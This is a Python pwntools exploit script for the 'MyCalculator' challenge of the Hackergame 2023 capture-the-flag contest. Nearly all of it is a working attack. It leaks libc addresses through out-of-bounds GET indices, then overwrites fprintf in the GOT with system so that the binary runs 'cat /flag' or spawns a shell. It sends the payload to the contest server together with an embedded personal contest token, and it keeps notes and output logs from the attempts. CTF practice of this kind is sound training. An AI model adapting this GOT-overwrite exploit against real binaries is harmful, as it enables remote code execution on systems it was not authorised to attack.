from pwn import *

context.log_level = 'error'
elf = ELF('/mnt/d/Documents/Hackergame2023/mycalculator/extract/MyCalculator')
libc = ELF('/mnt/d/Documents/Hackergame2023/mycalculator/extract/libc.so.6')
context.log_level = 'info'

def offtoi(off:int):
    assert off % 4 == 0, f'{off} should be int32 aligned'
    assert abs(off) < 2**31 * 4, f'{off} should be in int32 range'
    if off < 0:
        return (off // 4) + 2**32
    else:
        return off // 4

def addrtoput(addr:int, offset:int=0):
    rawint:int = struct.unpack('i', p64(addr)[offset:offset+4])[0]
    if rawint < 0:
        return '0' + str(rawint)
    else:
        return str(rawint)

buf_offset = elf.symbols['result_buffer']
data_start_offset = elf.symbols['__data_start']
print('__data_start', hex(data_start_offset))
# first and last GOT
free_got_offset = elf.got['free']
getc_got_offset = elf.got['getc']
puts_got_offset = elf.got['puts']
stderr_got_offset = elf.got['stderr']
print('stderr', hex(stderr_got_offset))
ferror_got_offset = elf.got['ferror']
printf_got_offset = elf.got['printf']
fprintf_got_offset = elf.got['fprintf']

# NOTE: before RELRO, got.plt points to the second instruction in plt region!(or plt entry+6, after PUSH)
fprintf_gotentry_offset = elf.plt['fprintf'] + 6
print('fprintf@got_entry', hex(fprintf_gotentry_offset))

printf_libc_offset = libc.functions['printf'].address
fprintf_libc_offset = libc.functions['fprintf'].address
one_gadgets = [0x4c050, 0xf2592, 0xf259a, 0xf259f]
one_gadget = one_gadgets[2]
system_libc_offset = libc.functions['system'].address
binshstr_libc_offset = 0x196031

CMD_LEN = 16
cmd_str = struct.unpack('i'*(CMD_LEN//4), b'cat /flag'.ljust(CMD_LEN, b'\x00'))
print(cmd_str)
cmd_offset = 800

exploit = f'''1094795585
GET {offtoi(printf_got_offset - buf_offset)}
GET {offtoi(printf_got_offset - buf_offset) + 1}
GET {offtoi(fprintf_got_offset - buf_offset)}
GET {offtoi(fprintf_got_offset - buf_offset) + 1}
1/0
PUT {cmd_offset + 0} {addrtoput(cmd_str[0])}
PUT {cmd_offset + 1} {addrtoput(cmd_str[1])}
PUT {cmd_offset + 2} {addrtoput(cmd_str[2])}
PUT {cmd_offset + 3} {addrtoput(cmd_str[3])}
PUT {offtoi(stderr_got_offset - buf_offset)} (GET 3)+{buf_offset}+{cmd_offset*4}-{fprintf_gotentry_offset}
PUT {offtoi(stderr_got_offset - buf_offset) + 1} (GET 4)
PUT {offtoi(fprintf_got_offset - buf_offset)} (GET 1)+{libc.functions['system'].address}-{printf_libc_offset}
1/0'''

# PUT {offtoi(fprintf_got_offset - buf_offset)} (GET 1)+{libc.functions['puts'].address}-{printf_libc_offset}
# PUT {offtoi(stderr_got_offset - buf_offset)} (GET 3)+{buf_offset}+{cmd_offset}-{fprintf_gotentry_offset}
print(exploit)
with open('mycalculator/pwn.calc','w') as fp:
    fp.write(exploit)

# exit(0)

# ============ connect to server =======
upload_b64 = base64.b64encode(exploit.encode()) + b'\nEOF\n'
conn = remote('202.38.93.111', 12000)
conn.sendlineafter(b'Please input your token:', b'752:MEUCIEOUeVlkbNMhXbMi3DyRzygGnmTP8wLoXVAoptlzfY/DAiEAoKez5rSQSEzFFTGdB/tMdftxEOWAf74c4nYUhBuQZcU=')
# GOTPLT_MEM = b''
conn.recvline_contains(b'Please input your file in a base64 encoded ')
context.log_level = 'error'

conn.send(upload_b64)

try:
    while True:
        res = conn.recvline(keepends=True, timeout=.5)
        if res:
            if res.startswith(b'output = '):
                continue
            if res.isascii():
                print(res.decode(), end='')
            else:
                print(res)
        else:
            break
except EOFError:
    print('\n=========\nEOF')

exit(0)


# ============= interaction start ==============
print('get printf@gotplt low addr')
cmdres = os.popen(f"echo 'GET {offtoi(printf_got_offset - buf_offset)}'|xclip")
printf_low = int(input('> '))

print('get printf@gotplt high addr')
cmdres = os.popen(f"echo 'GET {offtoi(printf_got_offset - buf_offset + 4)}'|xclip")
printf_high = int(input('> '))

printf_addr:int = u64(struct.pack('i', printf_low) + struct.pack('i', printf_high))
LIBC_BASE = printf_addr - printf_libc_offset
print(hex(LIBC_BASE), hex(printf_libc_offset), hex(printf_addr))

one_gadget_addr = LIBC_BASE + one_gadget
puts_idx = offtoi(puts_got_offset - buf_offset)
one_gadget_low = struct.unpack('i', p64(one_gadget_addr)[:4])[0]

system_low = struct.unpack('i', p64(LIBC_BASE + system_libc_offset)[:4])[0]
binsh_low = struct.unpack('i', p64(LIBC_BASE + binshstr_libc_offset)[:4])[0]
binsh_high = struct.unpack('i', p64(LIBC_BASE + binshstr_libc_offset)[4:])[0]

stderr_idx = offtoi(stderr_got_offset - buf_offset)
fprintf_idx = offtoi(fprintf_got_offset - buf_offset)

print('put binsh low to stderr')
cmdres = os.popen(f"echo 'PUT {stderr_idx} {addrtoput(LIBC_BASE + binshstr_libc_offset, 0)}'|xclip")
input('CONT> ')

print('put binsh high to stderr')
cmdres = os.popen(f"echo 'PUT {stderr_idx + 1} {addrtoput(LIBC_BASE + binshstr_libc_offset, 4)}'|xclip")
input('CONT> ')

print('put system low to fprintf')
cmdres = os.popen(f"echo 'PUT {fprintf_idx} {addrtoput(LIBC_BASE + system_libc_offset, 0)}'|xclip")
input('CONT> ')

print('NOW trigger error and get shell')

# if one_gadget_low < 0:
#     one_gadget_low = '0' + str(one_gadget_low)
# print('Lets do some benevolent change: puts=>printf')
# cmdres = os.popen(f"echo 'PUT {puts_idx} {printf_low}'|xclip")



# 目前思路：利用yyerror里的fprintf，因为stderr我们可以控制内容，可以把fprintf覆写为system从而getshell或者打印flag
# libc地址有，应该可以getshell，希望栈对齐啊啊啊啊
# 本地栈是对齐的，但是远程好像getshell不行（直接所有输出都没了），那可能必须得orw了
# 想到可以用未使用函数泄露plt地址，最终得到buffer地址


# print('')

# def get_line():
#     line = conn.recvline_contains(b'idx', keepends=False).decode()
#     out, idx = [int(s) for s in line.split('=')[1].split(')')[0].split('(Stored as idx')]
#     return idx, out

# conn = process('/mnt/d/Documents/Hackergame2023/mycalculator/extract/MyCalculator')
# if 'TMUX' in os.environ:
#     context.terminal = ['tmux', 'splitw', '-h']
#     # gdb.attach(pidof(conn)[0], 'b *$rebase(0x1904)\nb *$rebase(0x1951)')

# conn.interactive()


'''
$ extract/MyCalculator
1
output = 1 (Stored as idx 0)
GET 4294967248
output = -1439882048 (Stored as idx 1)
GET 4294967249
output = 32536 (Stored as idx 2)
PUT 4294967288 0-1438556111
output = -1438556111 (Stored as idx 3)
PUT 4294967289 32536
output = 32536 (Stored as idx 4)
PUT 4294967252 0-1439906912
output = -1439906912 (Stored as idx 5)
'''

# onserver
'''
output = 1 (Stored as idx 0)
output = -1088011072 (Stored as idx 1)
output = 32567 (Stored as idx 2)
output = -1086685135 (Stored as idx 3)
output = 32567 (Stored as idx 4)
output = -1088035936 (Stored as idx 5)
'''